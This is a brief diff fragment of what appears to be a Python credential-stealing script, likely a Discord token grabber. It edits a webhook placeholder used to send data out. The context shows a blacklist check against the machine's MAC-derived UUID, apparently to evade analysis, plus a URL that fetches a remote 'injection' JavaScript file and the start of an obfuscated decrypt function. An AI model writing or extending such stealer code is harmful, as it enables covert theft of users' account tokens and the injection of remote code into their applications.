@@ -50,7 +50,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = "WEBHOOK HERE"
+wh00k = 'WBH'
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 kr4mkr4m_c0de =  """function decrypt(chain) {
     let script = chain
